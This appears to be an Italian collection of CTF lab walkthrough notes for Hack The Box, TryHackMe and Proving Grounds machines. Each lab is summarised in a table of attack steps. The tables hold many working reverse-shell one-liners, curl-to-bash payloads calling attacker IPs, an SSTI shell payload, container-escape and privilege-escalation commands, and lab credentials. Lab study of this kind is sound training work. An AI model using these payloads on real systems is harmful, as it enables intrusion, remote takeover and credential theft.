| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **ISC BIND**          | `dig any @IP_TARGET DOMAIN_TARGET`                                                                                                                                                                               | Scopriamo che la porta `53` √® aperta, dunque possiamo cercare dei sottodomini. I sottodomini esposti sono `admin.cronos.htb` e `ns1.cronos.htb`                                                                                                                                                                                    |
| **SQL Injection**     | 1. `sqlmap -r request --dbms --batch`<br>2. `sqlmap -r request D DATABASE --tables`<br>3. `sqlmap -r request -D DATABASE -T TABLES --columns`<br>4. `sqlmap -r request -D DATABSE -T TABLES -C col1,col2 --dump` | Su `admin.cronos.htb` √® presente un'interfaccia di login. Catturando la richiesta ed usando `sqlmap` scopriamo che √® vulnerabile a SQL Injection da cui ci ricaviamo le credenziali `admin:4f5fffa7b2340178a716e3832451e058`. La password non pare craccabile, ma tramite una veloce ricerca su google troviamo la sua conversione |
| **Command Injection** | `;/bin/bash -c '/bin/bash -i >& /dev/tcp/IP_KALI/4444 >&1'`                                                                                                                                                      | Una volta entrato noto un input su cui si pu√≤ fare command injection separando con un `;` dunque lo sfrutto per avviare una reverse shell                                                                                                                                                                                          |
| **Cron job**          | `wget http://IP_KALI:8000/file.php`                                                                                                                                                                              | Scopro che su `/etc/crontab` l'utente root avvia ogni 60s un file php. L'utente attuale ha i permessi per sovrascrivere i file quindi sostituiamolo con una [reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php) in formato `php` e siamo root               |
- [wirteup](https://medium.com/@sam_0x0/htb-cronos-walkthrough-ca963bc0edcf)
### Passage

| üß† **Azione**       | üíª **Comando / Metodo**                                                                                                                                                                                                       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                              |
| ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CuteNews 2.1..2** | 1. `python3 exploit.py`<br>2.`http://passage.htb`<br>3. `bash -c 'bash -i >& /dev/tcp/IP_KALI/4444 0>&1'`                                                                                                                     | Identifichiamo il CMS `CuteNews 2.1.2` che √® vulnearabile a [RCE](https://www.exploit-db.com/exploits/48800) . Scarichiamo il file dal link di prima ed eseguiamo la *1.* infine indichiamo il dominio con la *2.* Ora abbiamo l'accesso come `www-data` dunque eseguiamo la reverse shell *3.*                                                                                                                                    |
| **Cracking**        | 1. `hashcat -m 1400 hash /usr/share/wordlists/rockyou.txt`                                                                                                                                                                    | Eseguendo l'exploit di prima notiamo che ci fornisce anche degli hashes che prende da `/CuteNews/cdata/users/lines`. Craccando con la *1.* gli hash SHA256 otteniamo la password `atlanta1` che provando su `paul` riusciamo ad entrare                                                                                                                                                                                            |
| **Shared SSH**      | 1. `sshkeygen -y -f id_rsa_paul`<br>2. `chmod 600 id_rsa`<br>3. `ssh -i id_rsa nadav@IP_TARGET`                                                                                                                               | Controllando la cartella `.ssh` di `paul` notiamo che la chiave pubblica `id_rsa.pub` porta il nome dell'utente `nadav` e non dell'utente che controlliamo attualmente. Questo potrebbe far pensare che i due utenti condividano la stessa chiave privata. Per maggiore sicurezza confrontiamo la chiave pubblica applicando la *1.* Le chiavi pubbliche sono uguali quindi usiamo la privata per entrare come `nadav` con la *3.* |
| **USB Creator**     | 1. `cd /tmp`<br>2. `gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_root true`<br>3. `ssh -i id_rsa_root root@IP_TARGET` | Eseguendo `linpeas.sh` con l'utente 'nuovo' ci accorgiamo che l'applicativo √® vulnerabile a *USB Creato* allora utilizziamo il comando per copiare la chiave privata dell'utente root ed entrare con essa                                                                                                                                                                                                                          |
- [writeup](https://cyberkareem.medium.com/hackthebox-passage-walkthrough-6860a0b1e76e)
### Popcorn

| üß† **Azione**     | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                         | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                            |
| ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TorrentHoster** | 1. `wget https://raw.githubusercontent.com/Anon-Exploiter/exploits/refs/heads/master/torrent_hoster_unauthenticated_rce.py`<br>2. `python2 torrent_hoster_unauthenticated_rce.py --url http://IP_TARGET/torrent`<br>3. `export RHOST="IP_KALI";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`<br> | Con un fuzzing directories troviamo il CMS `TorrentHoster` che secondo internet √® vulnerabile a [RCE](https://raw.githubusercontent.com/Anon-Exploiter/exploits/refs/heads/master/torrent_hoster_unauthenticated_rce.py) . Applichiamo la *2.* per ottenere una shell ed una reverse shell in python con la *3.* |
| **motd**          | 1. `searchsploit -m 14339.sh`<br>2. *TARGET:*`bash 14339.sh`                                                                                                                                                                                                                                                                                                                                                                                    | All'interno del file `/home/george/.cache` √® presente il file `motd`vulnerabile a privilege escalation  se la versione di `PAM` che √® `1.1.0` . Applichiamo                                                                                                                                                      |

- [writeup](https://medium.com/@harellevy159/hackthebox-popcorn-write-up-51500a8d11ff)
### Ready

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                    | üìù **Output / Scopo**                                                                                                                                                                                                                                                           |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **GitLab 1.4.7**      | 1. ``` multi<br> sadd resque:gitlab:queues system_hook_push<br> lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'\|curl http://10.10.16.5/shell.sh\|bash\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"<br> exec<br> exec<br> exec```<br> | Con fuzzing directories troviamo che utilizza **GitLab 1.4.7** che √® vulnerabile a [RCE](https://github.com/jas502n/gitlab-SSRF-redis-RCE?tab=readme-ov-file) . Catturiamo al richiesta di creazione progettoe cambiamola come nella *1.* per fare un curl su una reverse shell |
| **Credential reused** | `su root`                                                                                                                                                                                                                                                                                                                                                                                                                  | Troviamo le credenziali dell'utente root in `/opt/backup/gitlab.rb`                                                                                                                                                                                                             |
| **Container**         | 1. ```d=`dirname $(ls -x /s*/fs/c*/*/r* \|head -n1)```<br>2. `mkdir -p $d/w;echo 1 >$d/w/notify_on_release`<br>3. ```t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab```<br>4. `touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl IP_KALI/rev.sh >'"$t/o" >/c;`<br>5. `chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";`                                                                                       | Poich√© siamo ancora nel container applichiamo la [Container Escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)                                                                                                                           |

- [writeup](https://0xdf.gitlab.io/2021/05/15/htb-ready.html)


### Devvortex

| üß† **Azione**            | üíª **Comando / Metodo**                                                     | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ------------------------ | --------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Subdomain**            |                                                                             | Facendo un fuzzing tra i sottodomini troviamo dev.devvortex.htb                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| **Joomla!  4.2.6**       | 1. `joomscan IP_TARGET`<br>2. `perl exploit.rb http://dev.devvortex.htb:80` | Facendo un fuzzing directories sul sottodominio scopriamo il path /administrator dvo'√® presente il CMS *Joomla!*. Scarichiamo il tool specifico per il CMS [joomscan](https://github.com/rezasp/joomscan.git) ed usiamo la *1.* per enumerarlo e trovare la versione *Joomla 4.2.6*.<br>La versione √® vulnerabile secondo [CVE-2023-23752](https://github.com/Acceis/exploit-CVE-2023-23752), scarichiamolo ed utilizziamo la *2.* per ottenere le credenziali dal database `lewis:P4ntherg0t1n5r3c0n##` |
| **Templates Cassiopeia** | 1. `nc -lvnp LPORT`                                                         | Carichiamo una reverse shell su SYSTEM=>SITE TEMPLATES=>CASSIOPEIA=>ERROR.PHP e per avviarla navighiamo `/templates/cassiopeia/error.php`                                                                                                                                                                                                                                                                                                                                                                |
| **DB**                   | 1. `mysql -u lewis -p`<br>2. `john hash rockyou.txt`                        | Entriamo nel database con la *1.* utilizzando la password trovata nel file `configuration.php`. Da qui ci ricaviamo la password hashata dell'utente `logan` e la cracchiamo con la *2.*                                                                                                                                                                                                                                                                                                                  |
| **SUDO**                 | 1. `sudo /usr/bin/apport-cli -f`<br>2. `!/bin/bash`                         | tra i permessi SUDO troviamo che possiamo avviare il file `apport-cli` che √® vulnerabile a [CVE-2023-1326](https://github.com/diego-tella/CVE-2023-1326-PoC).<br>Avviamo con la *1.*, permiamo `5`, poi `V` ed infine la *2.* per diventare root                                                                                                                                                                                                                                                         |


- [writeup](https://medium.com/@liwei.zhou/hack-the-box-walkthrough-devvortex-19f3c9e74747)


### Broker

| üß† **Azione**                         | üíª **Comando / Metodo**                                                                                            | üìù **Output / Scopo**                                                                                                                                                                                                                 |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **ActiveMQRealm Default Credentials** |                                                                                                                    | Dopo una scansione notiamo che sulla porta `80` √® presente il servizio *ActiveMQRealm*, provando le credenziali di default `admin:admin` riusciamo ad entrare.                                                                        |
| **ActiveMQRealm RCE**                 | 1. ![[Pasted image 20250815161403.png]]<br>2. `python3 exploit.py -i IP_TARGET -p 61616 -u http://IP_KALI/poc.xml` | Una volta autenticato √® vulnerabile a [CVE-2023-46604](https://github.com/evkl1d/CVE-2023-46604). Modifichiamo la `poc.xml` inserendo il nostro indirizzo IP come nella *1.*.Utilizziamo la *2.* per avviare la reverse shell         |
| **SUDO**                              | 1. `curl localhost:1339/root/root.txt`                                                                             | Tra i permessi SUDO troviamo `nginx` che √® vulnerabile a [sudo privesc](https://github.com/DylanGrl/nginx_sudo_privesc/tree/main). Carichiamo il file `exploit.sh` sul target e poi usiamo la *1.* per prendere file come utente root |


- [writeup](https://systemweakness.com/htb-broker-walkthrough-explanation-06c434044c3a)

### BoardLight

| üß† **Azione**       | üíª **Comando / Metodo**                                                            | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                            |
| ------------------- | ---------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Dolibarr 17.0.0** | 1. `python3 exploit.py -u admin -p admin -u http://crm.board.htb -r IP_KALI LPORT` | Con un fuzzing sui sottodomini troviamo `crm.board.htb` dove √® presente il servizio *Dolibarr 17.0.0.* accessibili con le credenziali di default `admin:admin`.<br>E' vulnerabile a RCE secondo [CVE-2023-30253](https://github.com/Rubikcuv5/cve-2023-30253), utilizziamo la *1.* per avviare una reverse shell |
| **SUID**            | 1. `./exploit.sh`                                                                  | Tra i file SUID notiamo *enlightment* che √® vulnerabile a [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit). Carichiamo sulla macchina target lo script ed avviamolo con la *1.* per diventare root                                                                                   |


- [writeup](https://medium.com/@pk2212/htb-boardlight-writeup-walkthrough-b6f6264fc1f5)

## Wordpress

### Blocky 

| üß† **Azione**                        | üíª **Comando / Metodo**                                                                                                       | üìù **Output / Scopo**                                |
| ------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| **Risoluzione DNS implicita**        | Aggiungo `blocky.htb` in `/etc/hosts`                                                                                         | Accesso corretto a `http://blocky.htb`               |
| **Scansione WordPress**              | `wpscan --url http://blocky.htb --enumerate u`                                                                                | Trovo user `notch` + plugin obsoleto                 |
| **Fuzzing sulle directories**        | `ffuf -u 'http://blocky.htb/FUZZ' -w usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt` | Trovo la cartella /plugins contenente 2 file JAR     |
| **Esplorazione JAR file**            | `unzip plugin.jar && strings *.class` `java -jar cfr.jar BlockyCore.class`                                                    | Trovo credenziali DB: `root:8YsqfCTnvxAUeduzjNSXe22` |
| **Accesso a phpMyAdmin**             | `http://blocky.htb/phpmyadmin` con `root / 8YsqfCTnvxAUeduzjNSXe22`                                                           | Accesso al DB, conferma utente WordPress             |
| **Dump e crack dell‚Äôhash WordPress** | Dump da tabella `wp_users` ‚Üí `john --wordlist=rockyou.txt hash.txt`                                                           | Trovo password WordPress di `notch` (uguale a root)  |
| **Accesso SSH come `notch`**         | `ssh notch@blocky.htb` con password: `8YsqfCTnvxAUeduzjNSXe22`                                                                | Shell utente `notch`                                 |
| **Escalation a root**                | `sudo -l` ‚Üí `sudo su`                                                                                                         | Ottengo shell root üè¥                                |
- [writeup](https://0xdf.gitlab.io/2020/06/30/htb-blocky.html)
### MrRobot

| üß† **Azione**                   | üíª **Comando / Metodo**                                                                                                | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                            |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Wordpress Authenticated RCE** |                                                                                                                        | Tramite un file `json` capiamo che il sito utilizza Wordpress come CMS. Troviamo le credenziali del pannello WP su una cartella. Una volta entrati utilizziamo la seguente [guida](https://medium.com/@akshadjoshi/from-wordpress-to-reverse-shell-3857ee1f4896) per avviare una reverse shell di pentestmonkey. |
| **SUID**                        | 1.`TF=$(mktemp)`<br>2. `echo 'os.execute("/bin/sh")' > $TF`<br>3. `/usr/bin/local/nmap --script=$TF`<br>4. `/bin/bash` | Tra i file SUID troviamo `nmap` che secondo [GTFObins](https://gtfobins.github.io/gtfobins/nmap/#suid) √® vulnerabile. Diventiamo finalmente root                                                                                                                                                                 |
- [writeup](https://medium.com/@RosanaFS/tryhackme-walkthrough-mr-robot-ctf-8e250162db69)
### Nukem

| üß† **Azione**              | üíª **Comando / Metodo**                                                                                                                                                                                                               | üìù **Output / Scopo**                                                                                                                                                                                                                                                                    |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Simple File List 4.2.2** | 1. `python3 48979.py http://IP_TARGET`                                                                                                                                                                                                | Notiamo che tra i plugin utilizza *Simple File List 4.2.2* che √® vulnerabile [RCE](https://www.exploit-db.com/exploits/48979)                                                                                                                                                            |
| **Credential Reused**      |                                                                                                                                                                                                                                       | Nel file `/srv/http/wo-config.php` trovo le credenziali dell'utente commander                                                                                                                                                                                                            |
| **VCN**                    | 1. `ssh -L5901:127.0.0.1:5901 -oKexAlgorithms=+diffie-hellman-group1-sha1 commander@nukem`<br>2. `vncviewer 127.0.0.1:5901`<br>3. *VCN:*`dosbox`<br>4. *DOSBOX:*`mount c /`<br>5. *DOSBOX:* `C:`<br>6. *DOSBOX:*`type root/proof.txt` | Noto che la porta `5901` che √® associata a VNC, possiamo utilizzare la *1.* per fare forwarding della porta sulla propria macchina. Con la *2.* ci colleghiamo con le credenziali di commander. Infine da VCN avviamo `dosbox` che √® SUID file. Montiamo il disco C:\ e troviamo il flag |
- [writeup](https://medium.com/@ardian.danny/oscp-practice-series-64-proving-grounds-30964bed6cf3)
### Internal

| üß† **Azione**              | üíª **Comando / Metodo**                                                                                                                                                                                                 | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                |
| -------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Simple File List 4.2.2** | 1. `docker run -it --rm wpscanteam/wpscan --url http://IP_TARGET --enumerate u,p,t`<br>2. `docker run -it --rm -v /usr/share/wordlists:/mnt wpscanteam/wpscan --url http://IP_TARGET/blog --passwords /mnt/rockyou.txt` | L'applicazione utilizza wordpress quindi facciamo un'enumerazione con la *1.*<br><br>Utilizziamo la *2.* per un bruteforce sull'utente trovato ed otteniamo le credenziali `admin:my2boys`                                                                                                                                           |
| **PHP Reverse shell**      | 1. `nc -lvnp LPORT`                                                                                                                                                                                                     | Apriamo la sezione `Appearance => Edit => 404.php` ed inseriamo la reverse shell di pentestmonkey. Adesso navighiamo `/blog/wp-content/themes/twentyseventeen/404.php` per avviare la reverse shell caricata<br><br>NB: abbiamo seguito questa [guida](https://medium.com/@akshadjoshi/from-wordpress-to-reverse-shell-3857ee1f4896) |
| **Credentials**            |                                                                                                                                                                                                                         | Una volta dentro trovo in `/opt/credentials` le credenziali di `aubreanna`                                                                                                                                                                                                                                                           |
| **Port Forwarding**        | 1. `ssh -L LPORT:127.0.0.1:RPORT -oKexAlgorithms=+diffie-hellman-group1-sha1 USER@IP_TARGET`                                                                                                                            | Notiamo una porta aperta sulla `8080` quindi usiamo la *1.* per fare port fowarding sulla nostra macchina                                                                                                                                                                                                                            |
| **Hydra**                  | 1. `hydra -s LPORT -l admin -P LIST_PASS localhost http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password' -f -I`                                | Applichiamo con la *1.* del bruteforcing sulla porta forwardata e troviamo le credenziali dell'amminsitratore                                                                                                                                                                                                                        |
| **Jenkins RCE Console**    | 1. `r = Runtime.getRuntime()`<br>2. `p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP_KALI/LPORT;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[])`<br>3. `p.waitFor()`<br>                          | Sul pannello amministratori √® presente una console che permette l'esecuzione di codice. Avviamo una reverse shell come in *1.*, *2.*, *3.* e diventiamo l'utente `jenkins`                                                                                                                                                           |
| **Credentials**            |                                                                                                                                                                                                                         | Nella seconda macchina troviamo il file `/opt/note.txt` dove sono presenti le credenziali root                                                                                                                                                                                                                                       |

- [writeup](https://olivierkonate.medium.com/internal-tryhackme-writeup-4b4d92d26f4d)
### Loly

| üß† **Azione**              | üíª **Comando / Metodo**                                                                                                                                                                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                                         |
| -------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Wordpress Bruteforcing** | 1. `docker run -it --rm wpscanteam/wpscan --url http://IP_TARGET --enumerate u,p,t`<br>2. `docker run -it --rm -v /usr/share/wordlists:/mnt wpscanteam/wpscan --url http://IP_TARGET/wordpress --passwords /mnt/rockyou.txt`<br> | Con fuzzing directories troviamo il percorso `wordpress`. Utilizziamo la *1.* per enumerare e la *2.* per fare un bruteforce. Troviamo le credenziali `loly:fernando`                                                                                         |
| **ADRotate**               | 1. `zip -r shell.zip rev.php`<br>2. ![[Pasted image 20250707144757.png]]                                                                                                                                                         | Poich√© √® presente *AdRotate* possiamo inserire una reverse shell in formato `.zip` che verr√† estratta. Con la *1.* zippiamo la reverse shell e con la *2.* la carichiamo. Infine navighiamo il percorso `/wordpress/wp-content/banners/rev.php` per eseguirla |
| **Wordpress config files** |                                                                                                                                                                                                                                  | Nel percorso `/var/www/html/wordpress/wp-config.php` troviamo le credenziali al DB che abbiamo usato per diventare utente `loly`                                                                                                                              |
| **Kernel Exploitation**    | 1. *KALI:* `searchsploit -m 45010`<br>2. *TARGET:* `gcc 45010.c -o exploit`<br>3. *TARGET: * `./exploit`                                                                                                                         | Il sistema utilizza la versione `Linux ubuntu 4.4.-031-generic` che √® vulnerabile secondo linpeas. Utilizziamo la *1.* per prendere l'exploitation, poi carichiamolo sul target ed eseguiamo *2.* e *3.*                                                      |

[writeup](https://medium.com/@marshal_demi/loly-write-up-proving-grounds-2574d05c9512)

### Blogger

| üß† **Azione**    | üíª **Comando / Metodo**                                        | üìù **Output / Scopo**                                                                                                                                                                                                                      |
| ---------------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Post**         | 1.![[Pasted image 20250710150938.png]]<br><br>                 | Con fuzzing directories troviamo il percorso `/assets/fonts/blog` dov'erano presenti diversi post. <br>Dai post si pu√≤ caricare un'immagine dunque carichiamo una reverse shell in PHP mascherandola come con il magic number come in *1.* |
| **DB Wordpress** | 1. `mysql -u root -p`<br>2. `john hash --wordlist=rockyou.txt` | In `/var/www/html/blog/wp-config.php` troviamo le credenziali al database. Utilizziamo la *1.* per entrare nel DB e la *2.* per craccare le password.                                                                                      |
| **SUDO**         | 1. `sudo su`                                                   | Utilizziamo le credenziali ottenute per cambiare utente. L'utente attuale ha tutti i permessi SUDO quindi con la *1.* diventiamo root                                                                                                      |

- [writeup](https://cyberarri.com/2024/03/17/blogger-pg-play-writeup/)

## Server-Side Template Injection (SSTI)
### Doctor

| üß† **Azione**      | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                               | üìù **Output / Scopo**                                                                                                                                                         |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **file hosts**     | `echo "doctors.htb" >> /etc/hosts`                                                                                                                                                                                                                                                                                                                                                                                                    | Inserisco il dominio trovato nella /home                                                                                                                                      |
| **SSTI**           | `{{7*'7'}}`                                                                                                                                                                                                                                                                                                                                                                                                                           | Controllo il codice sorgente e vedo il risultato √® `7777777`, quindi √® vulnerabile da SSTI                                                                                    |
| **Reverse shell**  | `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.16\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}` | La inserisco nel campo input per i post                                                                                                                                       |
| **Shaun username** | `cat .../apache2/backup`                                                                                                                                                                                                                                                                                                                                                                                                              | Troviamo una richiesta POST con la password in chiaro `shaun:Guitar123`                                                                                                       |
| **Root**           | `python3 PySplunkWhisperer2_remote.py --host $IP --port 8089 --lhost 10.10.16.16 --lport 8183 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.16.16/4444 0>&1'"`                                                                                                                                                                                                                                  | Avendo le credenziali di un utente che usa Splunk, ovvero shaun, allora possiamo scaricare [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/) per diventare root |

- [writeup](https://coldfusionx.github.io/posts/Doctor-HTB/)
## Samba

### Friendzone
| üß† **Azione**           | üíª **Comando / Metodo**                                                                                                                       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                    |
| ----------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Samba**               | 1. `smbclient -L //10.10.10.123`<br>2. `smclient //10.10.10.123 --no-pass`                                                                    | Trovo la lista di cartelle condivise accessibili come utente  anonimo. Trovo le credenziali `admin:WORKWORKHhallelujah@#`                                                                                                                                                                                                |
| **DNS**                 | 1. `dig axfr friendzone.red @10.10.10.123`<br>2. `nano /etc/hosts`                                                                            | La porta `53` √® utilizzata per il DNS. E' vulnerabile a zone transfer e ci restituisce tutti i sottodomini `administrator1.friendzone.red`, `uploads.friendzone.red` e `hr.friendzone.red`. Inseriamo i sottodomini nel file hosts e utilizziamo le credenziali trovate nel passaggio precedente per effettuare il login |
| **Samba scrivibile**    | 1.`smbclient --no-pass //10.10.10.123/Development`<br>2. `put reverse_shell.php`                                                              | Poich√© la cartella di samba `Development` √® sovrascrivibile inseriamo una [[Reverse shell#PHP]] ([pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)) al suo interno                                                                                                                           |
| **Reverse shell**       | `nc -lvnp 4444`                                                                                                                               | Navighiamo nel seguente link `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/reverse`                                                                                                                                                                                      |
| **Privilege to Friend** |                                                                                                                                               | nel percorso `/var/www/html` trovo il file di configurazione `mysql_data.conf` con le credenziali `friend:Agpyu12!0.213$` che uso per diventare utente friend                                                                                                                                                            |
| **RootBash**            | 1. `locate os.py`<br>2. `echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' >> /usr/lib/python2.7/os.py`<br> | Dentro `/opt/admin_server` trovo un file eseguito dal `root` chiamato `reporter.py` che invoca il modulo python `os.py`. Il modulo √® `/usr/lib/python2.7/os.py` ed √® sovrascrivibile quindi possiamo inserire una shell con permessi SUID                                                                                |
| **Root**                | `/tmp/rootbash -p`                                                                                                                            | Diventiamo `root`                                                                                                                                                                                                                                                                                                        |
- [writeup](https://sparshjazz.medium.com/hackthebox-friendzone-writeup-6467d0be83bf)


### Skynet

| üß† **Azione**    | üíª **Comando / Metodo**                                                                                                                                                                                                | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                       |
| ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SMB**          | 1. `enum4linux -a IP_TARGET`                                                                                                                                                                                           | Enumerando *SMB* con la *1.* troviamo che √® presente l'account `milesdyson` e con le credenziali anonime scarichiamo il contenuto del file `/anonymous` dove sono presenti delle credenziali nel file `log1.txt`.                                                                                                                                           |
| **SquirrelMail** |                                                                                                                                                                                                                        | Utilizziamo quelle credenziali per accedere al servizio `/squirrelmail` che abbiamo trovato con fuzzing directories. Al suo interno troviamo una mail che fa riferimento ad una password, utilizziamo quella password per accedere al servizio *SMB* e trovare un riferimento ad una cartella nascosta.                                                     |
| **CuppaCMS**     | 1. ![[Pasted image 20250811153226.png]]<br>2. `python3 -m http.server 80`                                                                                                                                              | Il riferimento alla cartella nascosta ci porta al servizio *CuppaCMS* che √® vulnerabile a [RFI](https://www.exploit-db.com/exploits/25971). Inseriamo una reverse shell in PHP come nella *1.* ed attendiamo che si colleghi con la *2.*                                                                                                                    |
| **Wildecard**    | 1. `echo -e '#!/bin/bash\nchmod +s /bin/bash' > /var/www/html/root_shell.sh`<br>2. `touch "/var/www/html/--checkpoint-action=exec=sh root_shell.sh"`<br>3. `touch "/var/www/html/--checkpoint=1"`<br>4. `/bin/bash -p` | Nella cartella dell'utente troviamo un file che zippa i file presenti nella cartella `/var/www/html` con `tar *`. Guardando crontab notiamo che il zip viene eseguito dal root ogni tot minuti, ci√≤ significa √® vulnerabile a *Wildecard*. Creiamo dei file con la *1.*,*2.* e *3.* che facciano eseguire dei comandi al root e con la *4.* diventiamo root |


- [writeup](https://tryhackme.com/resources/blog/skynet-writeup)

## Web shell

### Bashed

| üß† Azione                                        | üíª Comando Chiave                                                                                                                                                                                                  | **üìù Output / Scopo**                                             |
| ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------- |
| **Fuzzing del sito web**                         | `feroxbuster -u http://<IP> -t 200 -x php,txt,html`<br>`ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<IP>/FUZZ -recursion -recursion-depth 1 -e php -v` |                                                                   |
| **Ottenere una reverse shell**                   | `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`        | Scoperto `/dev/phpbash.php`, una shell interattiva                |
| **Stabilizzare la shell interattiva**            | `python3 -c 'import pty; pty.spawn("/bin/bash")'`<br>CTRL + Z<br>`stty raw -echo`<br>`fg`<br>`export TERM=xterm`                                                                                                   | Stabilita una reverse shell sulla macchina target                 |
| **Escalation dei privilegi a scriptmanager**     | `sudo -i -u scriptmanager`                                                                                                                                                                                         | Ottenuta una shell completamente interattiva                      |
| **Analisi della directory /scripts**             | `ls -la /scripts`<br>`cat /scripts/test.py`                                                                                                                                                                        | Accesso come utente `scriptmanager`                               |
| **Modifica di test.py per reverse shell**        | Sostituzione del contenuto di `test.py` con una reverse shell Python                                                                                                                                               | Trovato script `test.py` che genera `test.txt` con privilegi root |
| **Avvio del listener sulla macchina attaccante** | `nc -lnvp 4321`                                                                                                                                                                                                    | Preparato script per ottenere accesso root                        |
